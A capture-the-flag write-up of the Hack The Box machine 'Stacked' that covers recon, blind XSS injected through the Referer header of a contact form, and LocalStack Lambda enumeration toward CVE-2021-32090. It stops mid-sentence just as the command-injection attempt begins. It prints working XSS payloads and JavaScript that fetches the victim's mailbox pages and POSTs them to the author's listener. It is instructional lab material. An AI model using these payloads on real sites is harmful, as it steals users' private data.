---
title: HTB: Stacked
url: https://0xdf.gitlab.io/2022/03/19/htb-stacked.html
date: 2022-03-19T13:45:00+00:00
difficulty: Insane [50]
os: Linux
tags: hackthebox, ctf, htb-stacked, nmap, localstack, feroxbuster, wfuzz, vhosts, docker, docker-compose, xss, burp, burp-repeater, xss-referer, aws, awslocal, aws-lambda, cve-2021-32090, command-injection, pspy, container, htb-crossfit, htb-bankrobber, htb-bucket, htb-epsilon, oswe-like, oscp-plus-v2
---

![Stacked](https://0xdfimages.gitlab.io/img/stacked-cover.png)

Stacked was really hard. The foothold involved identifying XSS in a referer header that landed in an mail application that I could not see. I’ll use the XSS to enumerate that mailbox and find a subdomain used for an instance of localstack. From there, I’ll find I can create Lambda functions, and there’s a command injection vulnerability in the dashboard if it displays a malformed function name. I’ll use the XSS to load that page in an IFrame and trigger the vulnerability, providing a foothold in the localstack container. To escalate in that container, I’ll use Pspy to monitor what happens when localstack runs a lambda function, and find that it is also vulnerable to command injection as root. From root in the container, I can get full access to the host filesystem and a shell. In Beyond Root, I’ll take a look at the mail application and the automations triggering the XSS vulnerabilities.

## Box Info

| Name | [Stacked](https://hackthebox.com/machines/stacked)  [Stacked](https://hackthebox.com/machines/stacked) [Play on HackTheBox](https://hackthebox.com/machines/stacked) |
| --- | --- |
| Release Date | [18 Sep 2021](https://twitter.com/hackthebox_eu/status/1438517284247531523) |
| Retire Date | 19 Mar 2022 |
| OS | Linux Linux |
| Base Points | Insane [50] |
| Rated Difficulty | Rated difficulty for Stacked |
| Radar Graph | Radar chart for Stacked |
| First Blood User | 01:18:05[jazzpizazz jazzpizazz](https://app.hackthebox.com/users/87804) |
| First Blood Root | 05:34:08[Ziemni Ziemni](https://app.hackthebox.com/users/12507) |
| Creator | [TheCyberGeek TheCyberGeek](https://app.hackthebox.com/users/114053) |

## Recon

### nmap

`nmap` finds three open TCP ports, SSH (22), HTTP (80), and a service `nmap` identifies as Docker (2376):

```

oxdf@hacky$ nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.11.112
Starting Nmap 7.80 ( https://nmap.org ) at 2022-03-16 17:35 UTC
Nmap scan report for stacked.htb (10.10.11.112)
Host is up (0.022s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
2376/tcp open  docker

Nmap done: 1 IP address (1 host up) scanned in 7.63 seconds

oxdf@hacky$ nmap -p 22,80,2376 -sCV -oA scans/nmap-tcpscripts 10.10.11.112
Starting Nmap 7.80 ( https://nmap.org ) at 2022-03-16 17:35 UTC
Nmap scan report for stacked.htb (10.10.11.112)
Host is up (0.019s latency).

PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http        Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: STACKED.HTB
2376/tcp open  ssl/docker?
| ssl-cert: Subject: commonName=0.0.0.0
| Subject Alternative Name: DNS:localhost, DNS:stacked, IP Address:0.0.0.0, IP Address:127.0.0.1, IP Address:172.17.0.1
| Not valid before: 2021-07-17T15:37:02
|_Not valid after:  2022-07-17T15:37:02
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.20 seconds

```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) and [Apache](https://packages.ubuntu.com/search?keywords=apache2) versions, the host is likely running Ubuntu 20.04 Focal. There’s a TLS certificate on 2376, but it doesn’t seem to have much useful information.

### Website - TCP 80

#### Site

The site is for Stacked.htb, and it says it’s coming soon:

[![image-20210823134258552](https://0xdfimages.gitlab.io/img/image-20210823134258552.png)](https://0xdfimages.gitlab.io/img/image-20210823134258552.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20210823134258552.png)

Given the reference to `stacked.htb`, I’ll add that to my `hosts` file, but the site loads exactly the same by domain name.

The “Get notify by email” form at the bottom just sends a GET request to `index.html` with no parameters (not even the email given), so there’s not much here.

#### Tech Stack

The root page also loads as `index.html` (as observed in the form submission above), which doesn’t give much of a hint about what it is. Nothing exciting in the response headers. Apache is serving the site.

#### Directory Brute Force

I’ll run `feroxbuster` against the site, but it doesn’t find anything interesting:

```

oxdf@hacky$ feroxbuster -u http://stacked.htb

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.3.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://stacked.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.3.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
301        9l       28w      311c http://stacked.htb/images
301        9l       28w      310c http://stacked.htb/fonts
403        9l       28w      276c http://stacked.htb/server-status
[####################] - 1m     89997/89997   0s      found:3       errors:150    
[####################] - 1m     29999/29999   396/s   http://stacked.htb
[####################] - 1m     29999/29999   399/s   http://stacked.htb/images
[####################] - 1m     29999/29999   422/s   http://stacked.htb/fonts

```

### Virtual Hosts

Given there’s a domain mentioned on the page, I’ll look for subdomains with `wfuzz`. I’ll start it with no filter and immediately Ctrl-C it to cancel:

```

oxdf@hacky$ wfuzz -H "Host: FUZZ.stacked.htb" -u http://stacked.htb -w /usr/seclists/Discovery/DNS/subdomains-top1million-20000.txt 
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://stacked.htb/
Total requests: 19966

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000001:   302        9 L      26 W       284 Ch      "www"
000000009:   302        9 L      26 W       287 Ch      "cpanel"
000000006:   302        9 L      26 W       285 Ch      "smtp"
000000012:   302        9 L      26 W       284 Ch      "ns2"
000000003:   302        9 L      26 W       284 Ch      "ftp"
000000010:   302        9 L      26 W       284 Ch      "whm"
000000011:   302        9 L      26 W       284 Ch      "ns1"
000000008:   302        9 L      26 W       284 Ch      "pop"
000000007:   302        9 L      26 W       288 Ch      "webdisk"
000000005:   302        9 L      26 W       288 Ch      "webmail"
000000002:   302        9 L      26 W       285 Ch      "mail"
^C

```

It’s clear that the length in characters changes with the payload, but the words doesn’t. I’ll add `--hw 26` to hide the default response, and start it again. This time it finds only one more subdomain (as well as two errors):

```

oxdf@hacky$ wfuzz -H "Host: FUZZ.stacked.htb" -u http://stacked.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt --hw 26
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://stacked.htb/
Total requests: 19966

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000001183:   200        444 L    1779 W     30268 Ch    "portfolio"
000009532:   400        12 L     53 W       424 Ch      "#www"
000010581:   400        12 L     53 W       424 Ch      "#mail"

Total time: 0
Processed Requests: 19966
Filtered Requests: 19963
Requests/sec.: 0

```

### portfolio.stacked.htb - TCP 80

#### Site

This page is more about stacked.htb, and their localstack development:

[![image-20210824100250115](https://0xdfimages.gitlab.io/img/image-20210824100250115.png)](https://0xdfimages.gitlab.io/img/image-20210824100250115.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20210824100250115.png)

[LocalStack](https://github.com/localstack/localstack) allows for running an AWS-like environment on a local machine. In the middle of the page, there’s a section on their software:

![image-20210824100501624](https://0xdfimages.gitlab.io/img/image-20210824100501624.png)

The “Free Download!” button provides `docker-compose.yml`:

```

version: "3.3"

services:
  localstack:
    container_name: "${LOCALSTACK_DOCKER_NAME-localstack_main}"
    image: localstack/localstack-full:0.12.6
    network_mode: bridge
    ports:
      - "127.0.0.1:443:443"
      - "127.0.0.1:4566:4566"
      - "127.0.0.1:4571:4571"
      - "127.0.0.1:${PORT_WEB_UI-8080}:${PORT_WEB_UI-8080}"
    environment:
      - SERVICES=serverless
      - DEBUG=1
      - DATA_DIR=/var/localstack/data
      - PORT_WEB_UI=${PORT_WEB_UI- }
      - LAMBDA_EXECUTOR=${LAMBDA_EXECUTOR- }
      - LOCALSTACK_API_KEY=${LOCALSTACK_API_KEY- }
      - KINESIS_ERROR_PROBABILITY=${KINESIS_ERROR_PROBABILITY- }
      - DOCKER_HOST=unix:///var/run/docker.sock
      - HOST_TMP_FOLDER="/tmp/localstack"
    volumes:
      - "/tmp/localstack:/tmp/localstack"
      - "/var/run/docker.sock:/var/run/docker.sock"

```

This config specifies a LocalStack Docker container listening on 443, 4566, 4571, and probably 8080, offering different services. The `SERVICES=serverless` is a keyword specifically defined on the [localstack GitHub](https://github.com/localstack/localstack):

> `serverless`: run services often used for Serverless apps (`iam`, `lambda`, `dynamodb`, `apigateway`, `s3`, `sns`)

A bit further down the page there’s a “Contact Me” form:

![image-20210824100721981](https://0xdfimages.gitlab.io/img/image-20210824100721981.png)

This form actually does submit:

```

POST /process.php HTTP/1.1
Host: portfolio.stacked.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 78
Origin: http://portfolio.stacked.htb
DNT: 1
Connection: close
Referer: http://portfolio.stacked.htb/
Pragma: no-cache
Cache-Control: no-cache

fullname=test&email=0xdf%40stacked.htb&tel=012345667890&subject=test&message=test

```

A message pops up on the page:

![image-20210824102236663](https://0xdfimages.gitlab.io/img/image-20210824102236663.png)

#### Directory Brute Force

`feroxbuster` doesn’t find anything interesting here either:

```

oxdf@hacky$ feroxbuster -u http://portfolio.stacked.htb

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.3.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://portfolio.stacked.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.3.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
301        9l       28w      330c http://portfolio.stacked.htb/files
301        9l       28w      331c http://portfolio.stacked.htb/assets
301        9l       28w      327c http://portfolio.stacked.htb/js
301        9l       28w      328c http://portfolio.stacked.htb/css
403        9l       28w      286c http://portfolio.stacked.htb/server-status
[####################] - 1m    149995/149995  0s      found:5       errors:385    
[####################] - 1m     29999/29999   282/s   http://portfolio.stacked.htb
[####################] - 1m     29999/29999   284/s   http://portfolio.stacked.htb/files
[####################] - 1m     29999/29999   287/s   http://portfolio.stacked.htb/assets
[####################] - 1m     29999/29999   293/s   http://portfolio.stacked.htb/js
[####################] - 1m     29999/29999   303/s   http://portfolio.stacked.htb/css

```

Each of those 301s just redirects to adding `/` to the end and a 403 in return.

## Identify LocalStack VHost

### Identify XSS

#### Strategy

This is a cross-site scripting challenge that is quite difficult to identify, and the kind of thing that only belongs in the Insane level on a HTB machine. Given that I only have one real way to interact with the site at this point, I’ll focus on the contact form on portfolio.stacked.htb.

When I submit the form, there’s nothing displayed back to me, but rather it’s somehow transmitted to a potential user of the site. Thinking about ways to interact with the user, two come to mind:
- Sending a link to a page I’m hosting, and using various methods to exploit the user from there.
- Sending kind of cross-site scripting (XSS) payload that will be handled as HTML/JS on the receiving end, allowing me to run JavaScript and get the browser to take actions on my behalf.

#### Links

I’ll submit various kinds of links to the form. The phone number and email fields have tight restrictions, so I can’t place a link in them. But I’ll try the rest. For example:

![image-20210824105617868](https://0xdfimages.gitlab.io/img/image-20210824105617868.png)

I’ll also go into Burp and forward this request to Repeater. There I can get past the client-side filtering and send links in the other fields.

With a Python webserver watching for any contact, none comes.

#### XSS Fails

Turning to XSS, I tried started with a basic payload that would just redirect the page to my server:

```

<script>document.location="http://10.10.14.6/referer"</script>

```

On submitting, it pops an error:

![image-20210824111614093](https://0xdfimages.gitlab.io/img/image-20210824111614093.png)

There’s two ways to get around an error like this. One would be to try to bypass the filter with creative payloads that don’t trigger the filter but still execute JavaScript I provide. Unfortunately, I wasn’t able to find any way to do that.

The other is to try other fields. I’ll go through Burp to try the fields with client-side filtering, but all of them trigger the alert.

#### Referer

Thinking about what happens on submitting, there is an HTTP POST request to `process.php`. This script will parse the incoming request, pulling out whatever information from the request it wants, and generate some way to send that to the user who needs to handle the requests.

There may be cases where it makes sense to include something like the referrer header in this information. For example, if the same web page is used to manage contact me submissions from multiple sites. There’s a real life example of XSS in the Referer head [here](https://www.horizon3.ai/news/disclosures/mautic-unauth-xss-to-rce).

I’ll kick the form submission request over to Burp Repeater and set the referrer header to the XSS payload:

```

POST /process.php HTTP/1.1
Host: portfolio.stacked.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 208
Origin: http://portfolio.stacked.htb
DNT: 1
Connection: close
Referer: <script>document.location="http://10.10.14.6/referer"</script>

fullname=0xdf&email=0xdf%40stacked.htb&tel=012345667890&subject=Help&message=Please+help

```

On sending that, a few minutes later there are three requests at my Python webserver:

```

oxdf@hacky$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.112 - - [24/Aug/2021 11:15:04] code 404, message File not found
10.10.11.112 - - [24/Aug/2021 11:15:04] "GET /referer HTTP/1.1" 404 -
10.10.11.112 - - [24/Aug/2021 11:15:04] code 404, message File not found
10.10.11.112 - - [24/Aug/2021 11:15:04] "GET /favicon.ico HTTP/1.1" 404 -
10.10.11.112 - - [24/Aug/2021 11:15:04] code 404, message File not found
10.10.11.112 - - [24/Aug/2021 11:15:04] "GET /favicon.ico HTTP/1.1" 404 -

```

It actually makes life a bit easier if instead of redirecting the entire page to me, I just have it load JavaScript from my server. I’ll try with this payload:

```

<script src="http://10.10.14.6/xss.js"></script>

```

A minute later:

```
10.10.11.112 - - [24/Aug/2021 11:27:04] code 404, message File not found
10.10.11.112 - - [24/Aug/2021 11:27:04] "GET /xss.js HTTP/1.1" 404 -

```

### Orient

#### URL

In previous challenges where I had this kind of XSS access (like [CrossFit](/2021/03/20/htb-crossfit.html#identify-xss) and [BankRobber](/2020/03/07/htb-bankrobber.html#xss---admin-login)), I had a specific target in mind, some action I wanted to do as the admin. In this case, I’ve seen very little of the site, so I’ll need to do some orienting.

I’ll write a simple JS script that sends the current location of the page back to my server:

```

var exfilreq = new XMLHttpRequest();    
exfilreq.open("GET", "http://10.10.14.6/" + document.location, false);    
exfilreq.send(); 

```

After a minute, there’s a request to get the payload, followed by a request showing the url:

```
10.10.11.112 - - [24/Aug/2021 11:42:03] "GET /xss-1.js HTTP/1.1" 200 -
10.10.11.112 - - [24/Aug/2021 11:42:04] code 404, message File not found
10.10.11.112 - - [24/Aug/2021 11:42:04] "GET /http://mail.stacked.htb/read-mail.php?id=2 HTTP/1.1" 404 -

```

Nice. In that 404 I can see that the current location my script is executing in is `http://mail.stacked.htb/read-mail.php?id=2`. That looks like some kind of mail endpoint. I’ll try setting that subdomain in `/etc/hosts` and visiting it, but it must be only on localhost.

#### Source

I can update the JavaScript request slightly to pull the full page HTML:

```

var exfilreq = new XMLHttpRequest();    
exfilreq.open("POST", "http://10.10.14.6:9001/", false);    
exfilreq.send(document.documentElement.outerHTML); 

```

I’ll need a different port for the exfil as the Python HTTP server doesn’t handle POST requests. I’ll start `nc` listening on 9001. On sending the request again, after a minute, there’s a request for the JS:

```
10.10.11.112 - - [24/Aug/2021 11:51:03] "GET /xss-2.js HTTP/1.1" 200 -

```

Then a POST to `nc`:

```

oxdf@hacky$ nc -lnvp 9001
listening on [any] 9001 ...
connect to [10.10.14.6] from (UNKNOWN) [10.10.11.112] 45486 
POST / HTTP/1.1                                            
Host: 10.10.14.6:9001
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://mail.stacked.htb/read-mail.php?id=2        
Content-Length: 7954                                       
Content-Type: text/plain;charset=UTF-8
Origin: http://mail.stacked.htb                            
Connection: keep-alive

<html lang="en"><head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>AdminLTE 3 | Read Mail</title>
...[snip]...

```

I can save that to a file and open it in Firefox. The CSS / images don’t show (because they will be failed requests to mail.stacked.htb), but I can still see the general page and links:

![image-20210824115718119](https://0xdfimages.gitlab.io/img/image-20210824115718119.png)

The “Inbox” link points to `/dashboard.php`. I’ll actually make this page available from my VM and play with it in [Beyond Root](#message-app).

### View Mailbox

To get another page as this user and then return it, I’ll need to make two HTTP requests with JavaScript. The first will get the page I want, and the second will return the source just like above. The first request will get `/dashboard.php`. It will also have a `onreadystatechange` function that waits for the request to finish (`readyState == 4`), and then starts a new request to send the results back to me:

```

var dashboardreq = new XMLHttpRequest();    
dashboardreq.onreadystatechange = function() {              
  if (dashboardreq.readyState == 4) {                       
    var exfilreq = new XMLHttpRequest();                    
    exfilreq.open("POST", "http://10.10.14.6:9001/", false);                                                      
    exfilreq.send(dashboardreq.response);                 
  }     
};    
dashboardreq.open('GET', '/dashboard.php', false);    
dashboardreq.send();  

```

After a minute, I have another page that shows my email as well as one more from “Jeremy Taint”:

![image-20210824120713361](https://0xdfimages.gitlab.io/img/image-20210824120713361.png)

The link on the first one is `/read-mail.php?id=1`, and the subject line is interesting.

### Read Mail

The same payload as above, but with a different initial URL:

```

var mail1req = new XMLHttpRequest();    
mail1req.onreadystatechange = function() {    
  if (mail1req.readyState == 4) {    
    var exfilreq = new XMLHttpRequest();    
    exfilreq.open("POST", "http://10.10.14.6:9001/", false);    
    exfilreq.send(mail1req.response);    
  }    
};    
mail1req.open('GET', '/read-mail.php?id=1', false);    
mail1req.send();    

```

In the resulting page, there’s a message:

```

...[snip]...
<div class="mailbox-read-message">
    <p>Hey Adam, I have set up S3 instance on s3-testing.stacked.htb so that you can configure the IAM users, roles and permissions. I have initialized a serverless instance for you to work from but keep in mind for the time being you can only run node instances. If you need anything let me know. Thanks.</p>
</div>                             
<!-- /.mailbox-read-message -->  
...[snip]...

```

I’ll add s3-testing.stacked.htb to `/etc/hosts`. There is a service running there:

```

oxdf@hacky$ curl http://s3-testing.stacked.htb/
{"status": "running"}

```

## Shell as localstack on localstack

### AWS Enumeration

#### Install / Configure

I’ll need the AWScli (`apt install awscli`), and just like in [Bucket](/2021/04/24/htb-bucket.html#upload-to-bucket), I’ll need to configure it first:

```

oxdf@hacky$ aws configure 
AWS Access Key ID [None]: test
AWS Secret Access Key [None]: test
Default region name [None]: us-east-1
Default output format [None]: 

```

The localstack page suggests using `test` as the key and secret, but anything works as localstack doesn’t support auth yet.

Calling `aws` typically takes the following form:

```

aws [command] [subcommand] --endpoint-url http://s3-testing.stacked.htb 

```

`help` as a command or subcommand is really useful for listing all the capabilities of the client. Running `aws help` shows the full man page, including the list of commands.

#### Lambda Enumeration

Given the line in the config on the site `SERVICES=serverless`, it seems like Lambda would be a good feature to go after. Lambda is Amazon’s [serverless compute offering](https://aws.amazon.com/lambda/), and I showed some interactions with Lambda on [Epsilon](/2022/03/10/htb-epsilon.html#lambda). Instead of getting a VM in the cloud (like S3), you give it a function and a set of triggers, and when the trigger happens (which can be time based or event based), that function runs.

`aws lambda` has a `list-functions` subcommand, and it shows there are currently none on Stacked:

```

oxdf@hacky$ aws lambda list-functions --endpoint-url http://s3-testing.stacked.htb
{
    "Functions": []
}

```

### Create Lambda Function

#### Background

The AWS docs page for [create-function](https://docs.aws.amazon.com/cli/latest/reference/lambda/create-function.html) has a *ton* of information on it. I’m going to call with the following arguments:
- `--function-name` - whatever I want to call my function
- `--zip-file` - the name of the package I want to upload with the code in it
- `--handler` - the function to call, in the format `[filename].[function]`
- `--role` - the Amazon Resource Name (ARN) of the function’s execition role
- `--runtime` - what interpreter will be running the code (ie `python`, `nodejs`, etc)

[This page](https://docs.aws.amazon.com/lambda/latest/dg/gettingstarted-package.html#gettingstarted-package-zip) describes the format of the archive containing the code, and has links to how to create that zip for various languages. That’s mostly necessary when you want to bring outside packages or more complicated code to Lambda. I’ll be working with a single file.

I don’t have great details about what `role` looks like in the context of LocalStack, but I found this string in some examples, and it seemed to work:

```

arn:aws:iam::123456789012:role/lambda-role

```

Once I create a function, I’ll want to run it. I can use `aws lambda invoke` and pass it `--function-name` as well as `--payload` where I can pass in args.

#### Python

AWS also has [this sample code](https://github.com/awsdocs/aws-doc-sdk-examples/blob/master/python/example_code/lambda/boto_client_examples/lambda_handler_basic.py) on GitHub as a Python Lambda function. I’ll save it as `example.py`, and package it into a Zip file:

```

oxdf@hacky$ zip example.zip example.py 
  adding: example.py (deflated 50%)

```

I’ll upload it giving

```

oxdf@hacky$ aws lambda create-function --function-name example --zip-file fileb://example.zip --role arn:aws:iam::123456789012:role/lambda-role --endpoint-url http://s3-testing.stacked.htb --runtime python3.7 --handler example.lambda_handler
{
    "FunctionName": "example",
    "FunctionArn": "arn:aws:lambda:us-east-1:000000000000:function:example",
    "Runtime": "python3.7",
    "Role": "arn:aws:iam::123456789012:role/lambda-role",
    "Handler": "example.lambda_handler",
    "CodeSize": 738,
    "Description": "",
    "Timeout": 3,
    "LastModified": "2021-08-25T15:04:40.094+0000",
    "CodeSha256": "4MJzmV5OhOnWLUL0OPxiQQKwygBSIu9eLJfQcPd33wg=",
    "Version": "$LATEST",
    "VpcConfig": {},
    "TracingConfig": {
        "Mode": "PassThrough"
    },
    "RevisionId": "dcd12bc7-e715-4b33-962d-1077ce72f308",
    "State": "Active",
    "LastUpdateStatus": "Successful",
    "PackageType": "Zip"
}

```

The arguments from above. I’ll select `python3.7` from the list of [AWS lambda runtimes](https://docs.aws.amazon.com/lambda/latest/dg/lambda-runtimes.html), and it appears to work.

Next I’ll invoke it, giving it the function name and a file for output:

```

oxdf@hacky$ aws lambda invoke --function-name example out.json --endpoint-url http://s3-testing.stacked.htb 
{
    "StatusCode": 200,
    "FunctionError": "Unhandled",
    "LogResult": "",
    "ExecutedVersion": "$LATEST"
}

```

The fact that `FunctionError` is there is a bad sign. Looking in `out.json` (using `jq` to pretty print it):

```

{
  "errorMessage": "Lambda process returned error status code: 1. Result: . Output:\nUnable to find image 'lambci/lambda:20191117-python3.7' locally\nError response from daemon: Get https://registry-1.docker.io/v2/: dial tcp: lookup registry-1.docker.io: Temporary failure in name resolution\nmust specify at least one container source\njson: cannot unmarshal array into Go value of type types.ContainerJSON",
  "errorType": "InvocationException",
  "stackTrace": [
    "  File \"/opt/code/localstack/localstack/services/awslambda/lambda_api.py\", line 552, in run_lambda\n    result = LAMBDA_EXECUTOR.execute(func_arn, func_details, event, context=context,\n",
    "  File \"/opt/code/localstack/localstack/services/awslambda/lambda_executors.py\", line 174, in execute\n    return do_execute()\n",
    "  File \"/opt/code/localstack/localstack/services/awslambda/lambda_executors.py\", line 166, in do_execute\n    return _run(func_arn=func_arn)\n",
    "  File \"/opt/code/localstack/localstack/utils/cloudwatch/cloudwatch_util.py\", line 149, in wrapped\n    raise e\n",
    "  File \"/opt/code/localstack/localstack/utils/cloudwatch/cloudwatch_util.py\", line 145, in wrapped\n    result = func(*args, **kwargs)\n",
    "  File \"/opt/code/localstack/localstack/services/awslambda/lambda_executors.py\", line 157, in _run\n    raise e\n",
    "  File \"/opt/code/localstack/localstack/services/awslambda/lambda_executors.py\", line 145, in _run\n    result = self._execute(func_arn, func_details, event, context, version)\n",
    "  File \"/opt/code/localstack/localstack/services/awslambda/lambda_executors.py\", line 323, in _execute\n    result = self.run_lambda_executor(cmd, stdin, env_vars=environment, func_details=func_details)\n",
    "  File \"/opt/code/localstack/localstack/services/awslambda/lambda_executors.py\", line 229, in run_lambda_executor\n    raise InvocationException('Lambda process returned error status code: %s. Result: %s. Output:\\n%s' %\n"
  ]
}

```

“Unable to find image ‘lambci/lambda:20191117-python3.7”. I tried a couple other Python runtimes, but with the same errors. I don’t think the Python runtimes are on this host.

#### NodeJS

The AWS [Node.js page](https://docs.aws.amazon.com/lambda/latest/dg/nodejs-handler.html) has a really simple example Lambda JavaScript script:

```

exports.handler =  async function(event, context) {
  console.log("EVENT: \n" + JSON.stringify(event, null, 2))
  return context.logStreamName
}

```

After saving as `index.js`, I’ll it to an archive:

```

oxdf@hacky$ zip index.zip index.js 
  adding: index.js (deflated 14%)

```

I’ll upload the script to Lambda using a runtime from the page above. `nodejs14.x` isn’t on Stacked (just like Python), but `node12.x` is:

```

oxdf@hacky$ aws lambda create-function --function-name ex --zip-file fileb://index.zip --role arn:aws:iam::123456789012:role/lambda-role --endpoint-url http://s3-testing.stacked.htb --handler index.handler --runtime nodejs12.x
{
    "FunctionName": "ex",
    "FunctionArn": "arn:aws:lambda:us-east-1:000000000000:function:ex",
    "Runtime": "nodejs12.x",
    "Role": "arn:aws:iam::123456789012:role/lambda-role",
    "Handler": "index.handler",
    "CodeSize": 291,
    "Description": "",
    "Timeout": 3,
    "LastModified": "2021-08-25T17:15:18.892+0000",
    "CodeSha256": "RflcSNGUgqyNEvEtX4iMOtjiR8yEmBLyRFZIk3h+BDE=",
    "Version": "$LATEST",
    "VpcConfig": {},
    "TracingConfig": {
        "Mode": "PassThrough"
    },
    "RevisionId": "eb6d8003-ef40-4df5-8616-c97d4b08f5df",
    "State": "Active",
    "LastUpdateStatus": "Successful",
    "PackageType": "Zip"
}

```

On invoking it, the return doesn’t have an error, and the output is in the file:

```

oxdf@hacky$ aws lambda invoke --function-name ex --endpoint-url http://s3-testing.stacked.htb out.json
{
    "StatusCode": 200,
    "LogResult": "",
    "ExecutedVersion": "$LATEST"
}
oxdf@hacky$ cat out.json 
"2021/08/25/[$LATEST]e8413d1630b798e88ef9005ff0f5ab93"

```

### Fail - Lambda Rev Shell

My first instinct when I get this kind of execution is to use it to get a shell. In hindsight, this doesn’t make a ton of sense. A Lambda function can be thought of as spinning up a relatively empty container, running the function, and then tearing that container down. Even with execution in the container, there won’t be anything there, and it will die off quickly.

### RCE on LocalStack

#### Background

Some googling for “exploit localstack lambda” leads to [this article](https://blog.sonarsource.com/hack-the-stack-with-localstack) by SonarSource, which includes a command injection vulnerability in LocalStack, CVE-2021-32090. The idea here is that there is a command injection in the function name that is triggered when it’s displayed on the web dashboard.

The default port for the dashboard is 8080, so based on the config I leaked earlier, it seems like that is enabled (though only available on localhost):

```

    ports:
      - "127.0.0.1:443:443"
      - "127.0.0.1:4566:4566"
      - "127.0.0.1:4571:4571"
      - "127.0.0.1:${PORT_WEB_UI-8080}:${PORT_WEB_UI-8080}"

```

Since all of those services are listening on localhost, only if there’s something forwarding the port on can I access it. Given that Apache is hosting the web server, it seems that requests to `s3-testing.stacked.htb` are being sent to the LocalStack container. But I haven’t found anything forwarding to the dashboard on 8080.

#### Dashboard

For this to work, I need to prove the dashboard exists. I’ll create another XSS payload to try to fetch and return the it:

```

var mail1req = new XMLHttpRequest();    
mail1req.onreadystatechange = function() {    
  if (mail1req.readyState == 4) {    
    var exfilreq = new XMLHttpRequest();    
    exfilreq.open("POST", "http://10.10.14.6:9001/", false);    
    exfilreq.send(mail1req.response);    
  }    
};    
mail1req.open('GET', 'http://localhost:8080/', false);    
mail1req.send();   

```

It does…but the page is not complete - Where I would expect to find the body is just this:

```

...[snip]...
<div id="page" class="fullsize">
  <!-- Header -->
  <header id="header" role="banner" style="position: absolute;
      top: 0px; width: 100%; border-bottom: 1px solid #aaaaaa; background: #fafaf4">
    <nav class="aui-header aui-dropdown2-trigger-group" role="navigation">
      <div class="aui-header-inner">
        <div class="aui-header-primary">
          <h1 id="logo" class="aui-header-logo aui-header-logo-textonly">
                        <span class="aui-header-logo-device">
                <img src="img/localstack_small.png" style="height: 30px; padding: 2px; margin-right: 10px;"/>
              </span>
          </h1>
        </div>
      </div>
    </nav>
  </header>

  <!-- Content -->
  <section id="content" role="main" ui-view class="fullsize" style="position: absolute; top: 0px; padding-top: 40px; z-index: 1"> </section>

</div>
...[snip]...

```

This is a shell page that uses JavaScript to load the rest of the application. That’s ok for now, but worth keeping in mind.

#### Initial Attempt

Given that the dashboard exists, this seems like a valuable path to explore. The exploit is simply putting an injection into the function name, and then visiting the dashboard. I tried some shots in the dark to get this to work, such as:

```

